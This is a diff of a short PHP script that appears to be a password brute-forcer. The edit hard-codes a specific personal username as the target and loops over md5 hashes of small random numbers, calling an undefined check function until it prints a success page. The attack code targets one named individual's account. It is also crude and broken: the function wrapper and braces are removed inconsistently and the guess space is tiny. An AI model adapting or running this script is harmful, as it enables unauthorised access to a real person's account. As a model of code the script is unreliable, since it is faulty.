@@ -1,12 +1,11 @@
 <?php
 $time = microtime() * 100000;
-$username = "USERNAMEHERE";
+$username = "charlotte.scheurleer1";
 echo "https://twitter.com/LizardL4nds";
-function bruteForce($username, $Pass)
-{
+
 while(True)
 {     
-	$Pass = md5(rand());
+	$Pass = md5(rand(1, 20));
 
 	if(check_correct($username, $Pass)) {
             die("<table cellpadding='0' cellspacing='0' boreder='1' align='center' class='raster_table' width='75%'>
@@ -18,7 +17,7 @@ while(True)
 </table>
 </body>
 </html>");
-    }
+    
 }
     echo "<table cellpadding='0' cellspacing='0' boreder='1' align='center' class='raster_table' width='75%'>
     <tr>
